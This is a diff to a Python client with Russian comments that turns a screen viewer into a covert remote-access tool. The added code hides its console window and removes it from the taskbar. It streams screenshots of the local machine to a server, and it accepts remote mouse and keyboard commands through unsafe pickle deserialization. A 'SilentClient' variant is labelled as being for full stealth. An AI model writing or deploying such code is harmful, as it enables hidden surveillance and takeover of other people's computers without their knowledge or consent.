@@ -2,6 +2,8 @@ import socket
 import threading
 import cv2
 import numpy as np
+import pyautogui
+from pynput import mouse, keyboard
 import tkinter as tk
 from tkinter import messagebox, simpledialog
 import struct
@@ -9,13 +11,10 @@ import pickle
 import time
 import sys
 import os
-import win32gui
-import win32con
-import win32api
 import ctypes
 from ctypes import wintypes
 
-class HiddenClient:
+class ScreenShareClient:
     def __init__(self):
         self.socket = None
         self.running = False
@@ -36,9 +35,14 @@ class HiddenClient:
         """Скрывает консольное окно"""
         try:
             # Получаем handle консольного окна
-            console_window = win32gui.GetForegroundWindow()
-            # Скрываем окно
-            win32gui.ShowWindow(console_window, win32con.SW_HIDE)
+            console_window = ctypes.windll.kernel32.GetConsoleWindow()
+            if console_window:
+                # Скрываем окно
+                ctypes.windll.user32.ShowWindow(console_window, 0)
+                
+                # Убираем окно из панели задач
+                ctypes.windll.user32.SetWindowLongW(console_window, -20, 
+                                    ctypes.windll.user32.GetWindowLongW(console_window, -20) | 0x00000080)
         except:
             pass
             
@@ -46,9 +50,10 @@ class HiddenClient:
         """Скрывает приложение полностью"""
         try:
             # Получаем handle текущего процесса
-            hwnd = win32gui.GetForegroundWindow()
-            # Скрываем окно
-            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            if hwnd:
+                # Скрываем окно
+                ctypes.windll.user32.ShowWindow(hwnd, 0)
         except:
             pass
             
@@ -97,100 +102,69 @@ class HiddenClient:
         except Exception as e:
             return False
             
-    def receive_screen(self):
-        """Принимает и отображает скриншоты от сервера"""
+    def send_screen(self):
+        """Отправляет скриншоты на сервер"""
         try:
             while self.running and self.socket:
-                # Получаем размер данных
-                data_size = struct.unpack('!I', self.socket.recv(4))[0]
+                # Делаем скриншот
+                screenshot = pyautogui.screenshot()
+                frame = np.array(screenshot)
+                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                 
-                # Получаем данные изображения
-                data = b''
-                while len(data) < data_size:
-                    packet = self.socket.recv(data_size - len(data))
-                    if not packet:
-                        break
-                    data += packet
-                    
-                if len(data) == data_size:
-                    # Декодируем изображение
-                    frame_data = np.frombuffer(data, dtype=np.uint8)
-                    frame = cv2.imdecode(frame_data, cv2.IMREAD_COLOR)
-                    
-                    # Отображаем изображение
-                    cv2.imshow('Remote Screen', frame)
-                    
-                    # Обрабатываем события окна
-                    key = cv2.waitKey(1) & 0xFF
-                    if key == 27:  # ESC
-                        break
-                        
+                # Сжимаем изображение
+                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 70]
+                _, buffer = cv2.imencode('.jpg', frame, encode_param)
+                
+                # Отправляем размер данных и сами данные
+                data_size = len(buffer)
+                self.socket.send(struct.pack('!I', data_size))
+                self.socket.send(buffer.tobytes())
+                
+                time.sleep(0.1)  # 10 FPS
+                
         except Exception as e:
             pass
         finally:
-            cv2.destroyAllWindows()
+            self.cleanup()
             
-    def send_control_events(self):
-        """Отправляет события управления на сервер"""
+    def receive_control(self):
+        """Принимает команды управления от сервера"""
         try:
-            # Создаем окно для захвата событий
-            cv2.namedWindow('Remote Screen', cv2.WINDOW_NORMAL)
-            cv2.setMouseCallback('Remote Screen', self.on_mouse_event)
-            
-            # Захватываем клавиатуру
-            def on_key_press(key):
-                try:
-                    command = {
-                        'type': 'key_press',
-                        'key': key.char if hasattr(key, 'char') else str(key)
-                    }
-                    self.socket.send(pickle.dumps(command))
-                except:
-                    pass
+            while self.running and self.socket:
+                # Получаем команду
+                command_data = self.socket.recv(1024)
+                if not command_data:
+                    break
                     
-            def on_key_release(key):
-                pass
-                
-            # Запускаем слушатель клавиатуры в отдельном потоке
-            from pynput import keyboard
-            keyboard_listener = keyboard.Listener(
-                on_press=on_key_press,
-                on_release=on_key_release)
-            keyboard_listener.start()
-            
+                command = pickle.loads(command_data)
+                self.execute_command(command)
+                    
         except Exception as e:
             pass
             
-    def on_mouse_event(self, event, x, y, flags, param):
-        """Обрабатывает события мыши"""
+    def execute_command(self, command):
+        """Выполняет команду управления"""
         try:
-            if event == cv2.EVENT_MOUSEMOVE:
-                command = {
-                    'type': 'mouse_move',
-                    'x': x,
-                    'y': y
-                }
-                self.socket.send(pickle.dumps(command))
+            cmd_type = command.get('type')
+            
+            if cmd_type == 'mouse_move':
+                x, y = command['x'], command['y']
+                pyautogui.moveTo(x, y)
                 
-            elif event == cv2.EVENT_LBUTTONDOWN:
-                command = {
-                    'type': 'mouse_click',
-                    'x': x,
-                    'y': y,
-                    'button': 'left'
-                }
-                self.socket.send(pickle.dumps(command))
+            elif cmd_type == 'mouse_click':
+                x, y = command['x'], command['y']
+                button = command.get('button', 'left')
+                pyautogui.click(x, y, button=button)
                 
-            elif event == cv2.EVENT_RBUTTONDOWN:
-                command = {
-                    'type': 'mouse_click',
-                    'x': x,
-                    'y': y,
-                    'button': 'right'
-                }
-                self.socket.send(pickle.dumps(command))
+            elif cmd_type == 'key_press':
+                key = command['key']
+                pyautogui.press(key)
                 
-        except:
+            elif cmd_type == 'key_type':
+                text = command['text']
+                pyautogui.typewrite(text)
+                
+        except Exception as e:
             pass
             
     def run(self):
@@ -199,11 +173,11 @@ class HiddenClient:
             return
             
         # Запускаем потоки
-        screen_thread = threading.Thread(target=self.receive_screen)
+        screen_thread = threading.Thread(target=self.send_screen)
         screen_thread.daemon = True
         screen_thread.start()
         
-        control_thread = threading.Thread(target=self.send_control_events)
+        control_thread = threading.Thread(target=self.receive_control)
         control_thread.daemon = True
         control_thread.start()
         
@@ -221,7 +195,6 @@ class HiddenClient:
         self.running = False
         if self.socket:
             self.socket.close()
-        cv2.destroyAllWindows()
 
 # Альтернативная версия клиента без GUI (для полной скрытности)
 class SilentClient:
@@ -253,76 +226,66 @@ class SilentClient:
         except Exception as e:
             return False
             
-    def receive_screen(self):
-        """Принимает скриншоты от сервера (без отображения)"""
+    def send_screen(self):
+        """Отправляет скриншоты на сервер"""
         try:
             while self.running and self.socket:
-                # Получаем размер данных
-                data_size = struct.unpack('!I', self.socket.recv(4))[0]
+                # Делаем скриншот
+                screenshot = pyautogui.screenshot()
+                frame = np.array(screenshot)
+                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                 
-                # Получаем данные изображения
-                data = b''
-                while len(data) < data_size:
-                    packet = self.socket.recv(data_size - len(data))
-                    if not packet:
-                        break
-                    data += packet
-                    
-                # Просто игнорируем данные изображения
-                time.sleep(0.01)
+                # Сжимаем изображение
+                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 70]
+                _, buffer = cv2.imencode('.jpg', frame, encode_param)
+                
+                # Отправляем размер данных и сами данные
+                data_size = len(buffer)
+                self.socket.send(struct.pack('!I', data_size))
+                self.socket.send(buffer.tobytes())
+                
+                time.sleep(0.1)  # 10 FPS
                 
         except Exception as e:
             pass
             
-    def send_control_events(self):
-        """Отправляет события управления на сервер"""
+    def receive_control(self):
+        """Принимает команды управления от сервера"""
         try:
-            from pynput import mouse, keyboard
-            
-            def on_mouse_move(x, y):
-                try:
-                    command = {
-                        'type': 'mouse_move',
-                        'x': x,
-                        'y': y
-                    }
-                    self.socket.send(pickle.dumps(command))
-                except:
-                    pass
+            while self.running and self.socket:
+                # Получаем команду
+                command_data = self.socket.recv(1024)
+                if not command_data:
+                    break
                     
-            def on_mouse_click(x, y, button, pressed):
-                if pressed:
-                    try:
-                        command = {
-                            'type': 'mouse_click',
-                            'x': x,
-                            'y': y,
-                            'button': 'left' if button == mouse.Button.left else 'right'
-                        }
-                        self.socket.send(pickle.dumps(command))
-                    except:
-                        pass
-                        
-            def on_key_press(key):
-                try:
-                    command = {
-                        'type': 'key_press',
-                        'key': key.char if hasattr(key, 'char') else str(key)
-                    }
-                    self.socket.send(pickle.dumps(command))
-                except:
-                    pass
+                command = pickle.loads(command_data)
+                self.execute_command(command)
                     
-            # Запускаем слушатели
-            mouse_listener = mouse.Listener(
-                on_move=on_mouse_move,
-                on_click=on_mouse_click)
-            mouse_listener.start()
+        except Exception as e:
+            pass
             
-            keyboard_listener = keyboard.Listener(
-                on_press=on_key_press)
-            keyboard_listener.start()
+    def execute_command(self, command):
+        """Выполняет команду управления"""
+        try:
+            cmd_type = command.get('type')
             
+            if cmd_type == 'mouse_move':
+                x, y = command['x'], command['y']
+                pyautogui.moveTo(x, y)
+                
+            elif cmd_type == 'mouse_click':
+                x, y = command['x'], command['y']
+                button = command.get('button', 'left')
+                pyautogui.click(x, y, button=button)
+                
+            elif cmd_type == 'key_press':
+                key = command['key']
+                pyautogui.press(key)
+                
+            elif cmd_type == 'key_type':
+                text = command['text']
+                pyautogui.typewrite(text)
+                
         except Exception as e:
             pass
             
@@ -332,11 +295,11 @@ class SilentClient:
             return
             
         # Запускаем потоки
-        screen_thread = threading.Thread(target=self.receive_screen)
+        screen_thread = threading.Thread(target=self.send_screen)
         screen_thread.daemon = True
         screen_thread.start()
         
-        control_thread = threading.Thread(target=self.send_control_events)
+        control_thread = threading.Thread(target=self.receive_control)
         control_thread.daemon = True
         control_thread.start()
         
@@ -360,6 +323,6 @@ if __name__ == "__main__":
     if len(sys.argv) > 1 and sys.argv[1] == "--silent":
         client = SilentClient()
     else:
-        client = HiddenClient()
+        client = ScreenShareClient()
         
     client.run() 
